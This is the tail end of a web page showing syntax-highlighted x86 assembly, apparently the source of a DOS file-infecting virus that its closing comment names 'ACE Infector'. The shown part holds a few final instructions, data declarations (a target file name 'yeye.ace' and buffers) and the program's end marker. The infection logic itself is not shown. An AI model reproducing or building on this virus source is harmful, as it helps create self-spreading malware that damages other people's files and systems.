</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">; last value equal 0</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">cld</span><span class="sc0">                 </span><span class="sc1">; clear direction flag          </span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">name1</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'yeye.ace'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">fin</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">betaname</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">starttable</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">1024</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
    
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">temporary1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">256</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">

</span><span class="sc1">; - - - ACE Infector - - - - - - - - - - - - - - - - - - - - - - - - - - - - -</span><span class="sc0">
</span></div></body>
</html>
